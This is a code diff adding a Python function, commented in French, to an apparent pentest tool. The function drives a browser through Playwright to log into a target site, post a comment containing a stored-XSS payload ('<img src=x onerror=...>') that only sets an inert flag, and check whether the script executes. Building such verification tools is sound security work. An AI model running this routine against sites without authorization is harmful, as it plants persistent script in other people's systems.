@@ -123,6 +123,145 @@ def confirm_reflected_xss(
     return result
 
 
+def confirm_stored_xss_ui(
+    base_url: str,
+    login_link: str,
+    username_selector: str,
+    username_value: str,
+    password_selector: str,
+    password_value: str,
+    login_button: str,
+    content_link: str,
+    content_field: str,
+    submit_button: str,
+    headless: bool = True,
+    step_wait_ms: int = 2500,
+    nav_timeout_ms: int = 40000,
+) -> dict[str, Any]:
+    """
+    Confirme un XSS STOCKÉ en pilotant le vrai parcours UI :
+    accueil → login → page de contenu → poste un commentaire avec un marqueur
+    exécutant → vérifie si le script s'exécute (au rendu et après rechargement).
+
+    GÉNÉRIQUE : tous les sélecteurs/URL sont des paramètres (la config propre à
+    la cible vit côté appelant, dans tests/). Marqueur INERTE (drapeau window).
+
+    Args:
+        base_url: URL du frontend (SPA).
+        login_link: sélecteur du lien vers le login (ex. "a[href='/login']").
+        username_selector/value, password_selector/value: champs + identifiants.
+        login_button: sélecteur du bouton de connexion.
+        content_link: sélecteur du lien vers la page de contenu (ex. produit).
+        content_field: sélecteur du champ de saisie (ex. "textarea").
+        submit_button: sélecteur du bouton d'envoi (ex. bouton "Publier").
+
+    Returns:
+        Dict avec status, confirmed (bool), finding, notes, error.
+    """
+    started_at = datetime.now(timezone.utc)
+    result: dict[str, Any] = {
+        "tool": "xss_browser",
+        "status": "success",
+        "confirmed": False,
+        "finding": None,
+        "notes": [],
+        "duration_seconds": None,
+        "error": None,
+    }
+
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        result["status"] = "error"
+        result["error"] = "Playwright non installé."
+        return result
+
+    canary = f'<img src=x onerror="window.{EXEC_MARKER}=1">'
+
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=headless)
+            page = browser.new_context().new_page()
+
+            dialog_fired = {"value": False}
+            page.on("dialog", lambda d: (dialog_fired.__setitem__("value", True), d.dismiss()))
+
+            def executed() -> bool:
+                try:
+                    flag = bool(page.evaluate(f"() => window.{EXEC_MARKER} === 1"))
+                except Exception:
+                    flag = False
+                return flag or dialog_fired["value"]
+
+            # 1. Accueil
+            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+
+            # 2. Aller au login (clic) + se connecter
+            page.click(login_link, timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+            page.fill(username_selector, username_value, timeout=nav_timeout_ms)
+            page.fill(password_selector, password_value, timeout=nav_timeout_ms)
+            page.click(login_button, timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+            result["notes"].append(f"Connecté (URL: {page.url}).")
+
+            # 3. Aller sur la page de contenu (retour accueil puis clic)
+            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+            page.click(content_link, timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+
+            # 4. Poster un commentaire avec le marqueur exécutant
+            page.fill(content_field, f"PENTAGON test {canary}", timeout=nav_timeout_ms)
+            page.click(submit_button, timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+
+            # 5. Vérifie l'exécution au rendu immédiat
+            fired_on_render = executed()
+
+            # 6. Vérifie la persistance : on recharge la page de contenu
+            dialog_fired["value"] = False
+            page.goto(base_url, wait_until="networkidle", timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+            page.click(content_link, timeout=nav_timeout_ms)
+            page.wait_for_timeout(step_wait_ms)
+            fired_after_reload = executed()
+
+            if fired_on_render or fired_after_reload:
+                result["confirmed"] = True
+                result["finding"] = {
+                    "title": "XSS stocké CONFIRMÉ par exécution dans le navigateur",
+                    "severity": "high",
+                    "owasp": "A03:2021 Injection",
+                    "cwe": "CWE-79",
+                    "mitre": "T1059.007",
+                    "vector": "stored (confirmé navigateur)",
+                    "target": base_url,
+                    "evidence": "Un commentaire contenant une charge a été stocké puis "
+                                "rendu, et le script s'est RÉELLEMENT exécuté dans le DOM "
+                                f"(persistance après rechargement: {fired_after_reload}).",
+                }
+                result["notes"].append(
+                    f"Exécution au rendu: {fired_on_render} ; après rechargement: {fired_after_reload}."
+                )
+            else:
+                result["notes"].append(
+                    "Commentaire posté mais aucune exécution détectée "
+                    "(contenu probablement échappé par le frontend = sûr)."
+                )
+
+            browser.close()
+
+    except Exception as e:
+        result["status"] = "error"
+        result["error"] = f"{type(e).__name__}: {str(e)}"
+
+    ended_at = datetime.now(timezone.utc)
+    result["duration_seconds"] = (ended_at - started_at).total_seconds()
+    return result
+
+
 def self_test(headless: bool = True) -> dict[str, Any]:
     """
     Vérifie que la chaîne Playwright + détection d'exécution fonctionne, sans
